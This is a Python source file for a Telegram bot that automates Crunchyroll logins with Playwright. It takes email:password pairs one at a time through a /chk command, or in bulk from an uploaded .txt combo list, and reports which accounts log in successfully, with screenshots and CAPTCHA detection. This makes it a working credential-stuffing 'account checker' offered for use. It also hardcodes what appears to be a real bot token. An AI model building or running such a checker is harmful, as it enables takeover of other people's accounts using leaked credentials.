"""
Setting up a Crunchyroll Login Automation Bot
Fixed version for Render deployment
"""

import os
import logging
import asyncio
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters, CallbackQueryHandler
from playwright.async_api import async_playwright

# ════════════════════════════════════════════════════════
# 🔧 CONFIGURATION - From Environment
# ════════════════════════════════════════════════════════
TOKEN = os.getenv("BOT_TOKEN") or "8702671509:AAGNEgu2iorR0Maq8uwHRqVwNsx8IEMrzaA"

if not TOKEN:
    print("❌ Set BOT_TOKEN environment variable!")
    exit(1)
# ════════════════════════════════════════════════════════

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Rate limiting
user_last_request = {}
RATE_LIMIT_SECONDS = 10

async def is_rate_limited(user_id: int) -> bool:
    current_time = time.time()
    if user_id in user_last_request:
        if current_time - user_last_request[user_id] < RATE_LIMIT_SECONDS:
            return True
    user_last_request[user_id] = current_time
    return False

# ────────────────────────────────────────────────────────
# 🤖 LOGIN LOGIC
# ────────────────────────────────────────────────────────

async def login_crunchyroll(email: str, password: str) -> dict:
    """Login to Crunchyroll using SSO page"""
    
    async with async_playwright() as p:
        result = {"success": False, "screenshot": None, "message": ""}
        try:
            # Launch with more robust settings for Render
            browser = await p.chromium.launch(
                headless=True,
                args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"]
            )
            
            context = await browser.new_context(
                viewport={"width": 1280, "height": 800},
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
            )
            page = await context.new_page()
            
            # 1. Go to SSO login page
            sso_url = "https://sso.crunchyroll.com/login"
            
            logger.info(f"Navigating to {sso_url} for {email}")
            await page.goto(sso_url, timeout=60000, wait_until="networkidle")
            
            # 2. Handle cookie consent
            cookie_selectors = [
                "button#onetrust-accept-btn-handler",
                "button:has-text('Accept All')",
                "button:has-text('Accept all')",
                "button[data-testid='accept-button']"
            ]
            
            for sel in cookie_selectors:
                try:
                    btn = await page.wait_for_selector(sel, timeout=3000)
                    if btn:
                        await btn.click()
                        await asyncio.sleep(1)
                        break
                except:
                    pass
            
            # 3. Fill email
            try:
                email_field = await page.wait_for_selector("input[name='login']", timeout=10000)
                await email_field.fill(email)
                await email_field.press("Enter")
            except Exception as e:
                result["message"] = "❌ Email field not found (Possible Bot Detection)"
                result["screenshot"] = await page.screenshot()
                await browser.close()
                return result
            
            await asyncio.sleep(2)
            
            # 4. Fill password
            try:
                password_field = await page.wait_for_selector("input[name='password']", timeout=10000)
                await password_field.fill(password)
                await password_field.press("Enter")
            except Exception as e:
                # Check if it's already logged in or showing error
                content = await page.content()
                if "incorrect" in content.lower():
                    result["message"] = "❌ Incorrect email"
                else:
                    result["message"] = "❌ Password field not found"
                result["screenshot"] = await page.screenshot()
                await browser.close()
                return result
            
            # 5. Wait for result
            await asyncio.sleep(10)
            
            final_url = page.url.lower()
            page_content = await page.content()
            result["screenshot"] = await page.screenshot()
            
            if "captcha" in page_content.lower() or "recaptcha" in page_content.lower():
                result["message"] = "⚠️ CAPTCHA Blocked"
            elif "incorrect" in page_content.lower() or "wrong" in page_content.lower():
                result["message"] = "❌ Wrong email or password"
            elif "sso.crunchyroll.com" in final_url and "login" in final_url:
                result["message"] = "❌ Login not successful (Still on login page)"
            else:
                result["success"] = True
                result["message"] = "✅ Login Successful!"
                
        except Exception as e:
            logger.error(f"Login error: {e}")
            result["message"] = f"❌ Error: {str(e)[:100]}"
        finally:
            if 'browser' in locals():
                await browser.close()
        
        return result


# ────────────────────────────────────────────────────────
# 📱 TELEGRAM HANDLERS
# ────────────────────────────────────────────────────────

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🔐 Check Login", callback_data="check")],
        [InlineKeyboardButton("📋 Help", callback_data="help")],
        [InlineKeyboardButton("📁 Bulk Check", callback_data="bulk")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome = """🏠 *Welcome to Crunchyroll Bot*
━━━━━━━━━━━━━━━━━━━━━━
Use this bot to check Crunchyroll accounts.
━━━━━━━━━━━━━━━━━━━━━━
📝 *Commands:*
`/chk email password` - Check single
`/bulk` - Send .txt file
"""
    await update.message.reply_text(welcome, reply_markup=reply_markup, parse_mode='Markdown')

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """📚 *Instructions*
━━━━━━━━━━━━━━━━━━━━━━
🔐 *Single:* `/chk email password`
📁 *Bulk:* Send a .txt file with `email:password`
"""
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if await is_rate_limited(user_id):
        await update.message.reply_text("⏳ Wait 10s!")
        return
    
    if not context.args or len(context.args) < 2:
        await update.message.reply_text("🔐 Usage: `/chk email password`", parse_mode='Markdown')
        return
    
    email = context.args[0]
    password = " ".join(context.args[1:])
    
    msg = await update.message.reply_text("🔄 *Processing...*", parse_mode='Markdown')
    result = await login_crunchyroll(email, password)
    
    masked_email = f"{email[:3]}***@{email.split('@')[1]}" if "@" in email else email
    
    await msg.edit_text(f"{result['message']}\n📧 {masked_email}")
    
    if result["screenshot"]:
        await update.message.reply_photo(photo=result["screenshot"], caption=f"📸 {masked_email}")

async def cmd_bulk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📁 Send a `.txt` file with `email:password` on each line.")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Send a .txt file!")
        return
    
    # FIXED: Correct way to download in PTB v20+
    await update.message.reply_text("🔄 Downloading file...")
    tg_file = await context.bot.get_file(doc.file_id)
    file_path = f"bulk_{doc.file_id}.txt"
    await tg_file.download_to_drive(file_path)
    
    try:
        with open(file_path, 'r') as f:
            lines = [line.strip() for line in f if ":" in line]
        
        status_msg = await update.message.reply_text(f"📊 Processing {len(lines)} accounts...")
        
        success = failed = 0
        for i, line in enumerate(lines):
            email, password = line.split(":", 1)
            result = await login_crunchyroll(email, password)
            
            if result["success"]: success += 1
            else: failed += 1
            
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"{'✅' if result['success'] else '❌'} `{email}`: {result['message']}",
                parse_mode='Markdown'
            )
            
            if (i+1) % 2 == 0: # Update status every 2 accounts
                await status_msg.edit_text(f"📊 Progress: {i+1}/{len(lines)}\n✅ {success} | ❌ {failed}")
            
            await asyncio.sleep(1)
            
        await update.message.reply_text(f"🏁 Done!\n✅ Success: {success}\n❌ Failed: {failed}")
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")
    finally:
        if os.path.exists(file_path): os.remove(file_path)

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "check":
        await query.message.reply_text("Send: `/chk email password`")
    elif query.data == "help":
        await cmd_help(update, context)
    elif query.data == "bulk":
        await cmd_bulk(update, context)

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    logger.error("Exception while handling an update:", exc_info=context.error)
    if isinstance(update, Update) and update.effective_message:
        await update.effective_message.reply_text(f"⚠️ Internal Error: {str(context.error)[:100]}")

# ────────────────────────────────────────────────────────
# 🚀 MAIN
# ────────────────────────────────────────────────────────

def main():
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("chk", cmd_chk))
    app.add_handler(CommandHandler("bulk", cmd_bulk))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_error_handler(error_handler)
    
    print("✅ Bot started!")
    app.run_polling()

if __name__ == "__main__":
    main()
